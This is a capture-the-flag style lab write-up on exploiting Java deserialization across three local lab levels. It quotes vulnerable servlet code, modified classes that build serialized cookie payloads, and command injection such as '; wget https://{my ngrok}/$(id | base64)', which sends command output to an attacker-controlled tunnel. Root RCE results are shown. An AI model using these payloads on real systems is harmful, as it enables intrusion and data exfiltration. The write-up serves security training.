*** Java Deserialization Attack
[LEVEL 1] Target: http://localhost:13337/java-deserialize-lv1-1.0-SNAPSHOT/
	- Firstly, I wanna say that this lab is difficult than the previous labs, somethings new, but we gonna try to understand !
	- debug-java-web was made to help us debug the code, but I think it is a optional choice, I will dont use it
	- I see that, deserialize-exploit-tool is a tool that CBJS have made to help us to run the code
	- So we will look at the source code in deserialize-lv1
	- In HelloServlet.java file 
	
	package com.example.javadeserialize;
	// All java files are stored in /java/com/example/javadeserialize so we can access Admin and User class
	
	
	@WebServlet(name = "helloServlet", value = "/hello-servlet")
	// it will handle requests with the URL pattern to "/hello-servlet"
	
	public class HelloServlet extends HttpServlet {
    	public String serializeToBase64(Serializable obj) throws IOException {
        	ByteArrayOutputStream output = new ByteArrayOutputStream();
        	ObjectOutputStream oos = new ObjectOutputStream(output);
        	oos.writeObject(obj); // the data of the obj will be serialized here
        	oos.close();
        	return Base64.getEncoder().encodeToString(output.toByteArray());
    	}

    	private static Object deserializeFromBase64(String s) throws IOException, ClassNotFoundException {
        	byte[] data = Base64.getDecoder().decode(s);
        	ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
        	Object o  = ois.readObject();  // here it will be deserialized
        	ois.close();
        	return o;
    	}

    	public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        try {
            response.setContentType("text/html");
            PrintWriter out = response.getWriter();
            Map<String, String> cookieMap = Arrays.stream(request.getCookies()).collect(Collectors.toMap(Cookie::getName, Cookie::getValue));
            // Collect user cookie and set as cookiemap
            User user;
            if (!cookieMap.containsKey("user")) {
                user = new User();
                Cookie cookie = new Cookie("user", serializeToBase64(user));
                response.addCookie(cookie);
            } else {
                try {
                    user = (User)deserializeFromBase64(cookieMap.get("user"));
                } catch (Exception e) {
                    out.println("Please don't hack me");
                    e.printStackTrace();
                    return;
                }
            }
            out.println("<html><body>");
            out.println("<h1>Level 1 Hello " + user + "</h1>");
            out.println("</body></html>");
        } catch (Exception e) {
            response.setContentType("text/html");
            PrintWriter out = response.getWriter();
            out.println("Something went wrong");
            return;
        	}
    	}

    	public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
        doGet(request, response);
    	}

    	- In User.java dont have any things special, we can skip this one
    	
    	- In Admin.java we can see that
    	...
    	public class Admin extends User {
    	private String getNameCMD;
    	public Admin() {
        this.getNameCMD = "whoami";
    	}

    	@Override
    	public String toString() {
        	try {
            	Process proc = Runtime.getRuntime().exec(this.getNameCMD); // cmd wil be executed here, it will print out the name of user
            	BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            	return stdInput.readLine();
        	} catch (IOException e) {
            	return "";
        	}
    	}
	...
	
	=>> Now to solve this lab, we need to run exploit tool that cbjs made, to sure this tool run smoodly we copy all 3 files Admin.java HelloServlet.java User.java to 
	deserialize-exploit-tool/src/main/java/com/example/javadeserialize
	=>>But we need to fix a little bit to run serialize payload 
	
	+> HelloServlet.java:

            ...
            public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
                try {
                    response.setContentType("text/html");
                    PrintWriter out = response.getWriter();
                    Map<String, String> cookieMap = Arrays.stream(request.getCookies()).collect(Collectors.toMap(Cookie::getName, Cookie::getValue));
                    User user = new Admin(); //  Admin just are extended fron User, but why is Admin, since you will see in Admin.java file, we have Admin class
                    out.println(serializeToBase64(user)); // print out the serialized payload
                } 
            ... 
            }

        +> Admin.java:

            ... 
            public class Admin extends User {
                private String getNameCMD;
                public Admin() {
                    this.getNameCMD = "cat /etc/passwd";
                } ... }
	    ...
	
	=>> Now restart the lab, use ./build.sh
	
	=>> http://localhost:13337/deserialize-exploit-1.0-SNAPSHOT/hello-servlet => Payload: rO0ABXNy...9wYXNzd2Q=

    	=>> Replace the User's cookie in http://localhost:13337/java-deserialize-lv1-1.0-SNAPSHOT/hello-servlet with the payload just printed

    FINAL RESULT RCE  Hello root:x:0:0:root:/root:/bin/bash



[LEVEL 2] Target: http://localhost:13337/java-deserialize-lv2-1.0-SNAPSHOT/

	- This lab have many things new than the previous lab, but we just need to focus on the main source code
	- First, let take a look at MyHTTPClient.java file, there are some untrusted data i think it might help us to solve this lab
	...
                public class MyHTTPClient extends HTTPConnection {
                    private String host;

                    public MyHTTPClient(String host)  {
                        super("http://" + host); 
                        this.host = host;
                    }

                    public void sendRequest() {
                        String path = "/bin/bash";
                        ProcessBuilder pb = new ProcessBuilder(path, "-c", "curl " + this.host); 
                        try {
                            Process curlProcess = pb.start();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }

                    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException, InterruptedException {
                        in.defaultReadObject();
                        String path = "/bin/bash";
                        ProcessBuilder pb = new ProcessBuilder(path, "-c", "ping " + this.host);
                        Process ping = pb.start();
                        int exitCode = ping.waitFor();
                    }
                }
	
	...
	
	=>> You can see two functions sendRequest() and readObject(), so we gonna find two function in another file to look for vurnerable parts
	=>> sendRequest() I found that in MyRequestServlet.java which is used for a disabled feature, so we can not use it
	=>> readObject() I found that function in HelloServlet.java file which is very interesting things in this file
	
	...  
            public Object deserializeFromBase64(String s) throws IOException, ClassNotFoundException {
                byte[] data = Base64.getDecoder().decode(s);
                ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
                Object o  = ois.readObject(); // yah readObject() function was used there, so we can solve this lab by this way
                ois.close();
                return o;
            }
            
            
	// this function is a little bit the same with the previous level 
	public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
                try {
                    response.setContentType("text/html");
                    PrintWriter out = response.getWriter();
                    Map<String, String> cookieMap = Arrays.stream(request.getCookies()).collect(Collectors.toMap(Cookie::getName, Cookie::getValue));
                    User user; // Redirect user to MyHTTPClient and then we can have our payload 
                    if (!cookieMap.containsKey("user")) {
                        user = new User("guest");
                        Cookie cookie = new Cookie("user", serializeToBase64(user));
                        response.addCookie(cookie);
                    } else {
                        try {
                            user = (User)deserializeFromBase64(cookieMap.get("user")); // payload will be processed and executed there
                        } catch (Exception e) {
                            out.println("Please don't hack me");
                            e.printStackTrace();
                            return;
                        }
                    }
	
	
	=>> deserializeFromBase64() still be run, which means readObject() is still activated and our command can be execute
        =>> But how can we RCE when only ping command can execute, we will create a http server, and use this trick
        
        khanh@kali:~/Desktop$ curl http://127.0.0.1:1234/$("whoami")
	<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
	<html>
    	<head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    	</head>
    	<body>
        <h1>Error response</h1>
        <p>Error code: 404</p>
        <p>Message: File not found.</p>
        <p>Error code explanation: HTTPStatus.NOT_FOUND - Nothing matches the given URI.</p>
   	 </body>
	</html>
	
	khanh@kali:~/Desktop$ python3 -m http.server 1234
	Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
	127.0.0.1 - - [01/Mar/2024 18:48:44] code 404, message File not found
	127.0.0.1 - - [01/Mar/2024 18:48:44] "GET /khanh HTTP/1.1" 404 -


	- we gonna fixe HelloServlet.java to print out the payload
            
            ...
            public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
                try {
                    response.setContentType("text/html");
                    PrintWriter out = response.getWriter();
                    MyHTTPClient user = new MyHTTPClient("-h ; wget https://{my ngrok}/$(id | base64)");
                    out.println(serializeToBase64(user));
                } catch (Exception e) {
                    response.setContentType("text/html");
                    PrintWriter out = response.getWriter();
                    out.println("Something went wrong");
                    return;
                }
            } ...

        => We will have the cookie that was printed on the screen rO0ABXNyAChj....2U2NCk=
        
        =>> Do the same work with the previous level, reload the webpage with the cookie we have
        Session Status                online                                                                
	Account                       khanhnq1611 (Plan: Free)                                              
	Version                       3.6.0                                                                 
	Region                        Asia Pacific (ap)                                                     
	Latency                       63ms                                                                  
	Web Interface                 http://127.0.0.1:4040                                                 
	Forwarding                    https://372a-123-24-176-146.ngrok-free.app -> http://localhost:1234   
                                                                                                    
	Connections                   ttl     opn     rt1     rt5     p50     p90                           
                              1       0       0.01    0.00    0.00    0.00                          
                                                                                                    
	HTTP Requests                                                                                       
	-------------                                                                                       
                                                                                                    
	GET /dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCkK 502 Bad Gateway 
	
	=>> decode these base64 code we will get 
	FINAL RESULT RCE uid=0(root) gid=0(root) groups=0(root)
	
	
[LEVEL 3] Target: http://localhost:13337/java-deserialize-lv3-1.0-SNAPSHOT/

	- I can see that this lab is a little bit easier than the previous one
	- Let take a look at MyHTTPClient.java file

            ...
            public void sendRequest() { // this function can not use, we still skip this 
                String path = "/bin/bash";
                ProcessBuilder pb = new ProcessBuilder(path, "-c", "curl " + this.host);
                try {
                    Process curlProcess = pb.start();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            @Override
            public void connect() throws IOException, InterruptedException { // This might be the key to solve this level 
                String path = "/bin/bash";
                ProcessBuilder pb = new ProcessBuilder(path, "-c", "ping " + this.host);
                Process ping = pb.start();
                int exitCode = ping.waitFor();
            }
            ...
	
	
	- Let see TestConnection.java file 

            ...
            public class TestConnection implements Serializable {
                public HTTPConnection connection;
                public TestConnection(HTTPConnection connection) {
                    this.connection = connection;
                }
                private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException, InterruptedException {


                    in.defaultReadObject();
                    this.connection.connect(); // here we go !! connect() function can be execute here
                }
            }
            ...
            
          - Since HelloServlet.java files are the same, we just need to fix the code like the same way we did
          
          ...
            public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
                try {
                    response.setContentType("text/html");
                    PrintWriter out = response.getWriter();

                    MyHTTPClient user = new MyHTTPClient("; wget https://{my ngrok}/$(id | base64)"); // since the original connect() fucntion is in MyHTTPClient class
                    TestConnection payload = new TestConnection(user);       // and connect() function is executed in TestConnection class

                    out.println( serializeToBase64(payload));
                }
          ...
	
	=>> Do the same work like we usually did, we will get the cookie rO0ABXNy...09jhQ==
	=>> It like the previous level, so I do not write it here
	
	FINAL RESULT RCE uid=0(root) gid=0(root) groups=0(root)
	
	
	
	
	
	
	
	

        
	
